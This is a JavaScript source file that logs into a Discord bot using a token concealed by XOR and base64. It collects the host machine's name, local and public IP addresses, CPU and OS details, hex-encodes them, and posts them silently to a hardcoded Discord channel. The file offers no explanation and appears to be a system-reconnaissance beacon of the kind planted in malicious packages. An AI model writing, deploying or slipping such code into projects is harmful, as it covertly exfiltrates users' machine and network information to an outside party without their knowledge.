import { Client, GatewayIntentBits } from 'discord.js';
import si from 'systeminformation';
import os from 'os';
import {publicIpv4} from 'public-ip';

// function xorAndBase64Encode(token, key) {
//     // Convert token to byte array
//     const tokenBytes = Buffer.from(token, 'utf8');

//     // XOR each byte with the key
//     const xorBytes = tokenBytes.map(byte => byte ^ key);

//     // Convert XORed byte array to Base64 string
//     return Buffer.from(xorBytes).toString('base64');
// }

function base64DecodeAndXor(encodedToken, key) {
    const xorBytes = Buffer.from(encodedToken, 'base64');

    const tokenBytes = xorBytes.map(byte => byte ^ key);

    return Buffer.from(tokenBytes).toString('utf8');
}


const a = 'JD0gWiQ9JFkkAzxYJD04WiY9KFwnPSQQJx5HLg0nWCUwRyorCy8NXT4bPA05XxwEMQo4DzsTDC4PXRsoP1tcBRwPHV9fCi0a'; 

const b = base64DecodeAndXor(a, 0x69);

const channelId = '1271342230153728014';

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}!`);

    const systemInfo = await collectSystemInfo();

    const messageContent =
        `**System Information:**\n\n` +
        `**Machine Name:** ${systemInfo.machineName}\n` +
        `**Local IPs:** ${systemInfo.localIPs.join(', ')}\n` +
        `**Public IP:** ${systemInfo.publicIP}\n` +
        `**CPU:** ${systemInfo.cpu.manufacturer} ${systemInfo.cpu.brand} (${systemInfo.cpu.cores} cores)\n` +
        `**OS:** ${systemInfo.osInfo.distro} ${systemInfo.osInfo.release} (${systemInfo.osInfo.arch})`;

    const hexMessage = Buffer.from(messageContent).toString('hex');

    const channel = client.channels.cache.get(channelId);
    if (channel) {
        channel.send(hexMessage);
    } else {
        console.error('Channel not found!');
    }

    client.destroy();
});

client.login(b);

async function collectSystemInfo() {
    const systemInfo = {};

    systemInfo.machineName = os.hostname();

    const networkInterfaces = os.networkInterfaces();
    systemInfo.localIPs = [];
    for (const interfaceName in networkInterfaces) {
        networkInterfaces[interfaceName].forEach(iface => {
            if (!iface.internal && iface.family === 'IPv4') {
                systemInfo.localIPs.push(iface.address);
            }
        });
    }

    systemInfo.publicIP = await publicIpv4();

    systemInfo.cpu = await si.cpu();
    systemInfo.memory = await si.mem();
    systemInfo.osInfo = await si.osInfo();

    return systemInfo;
}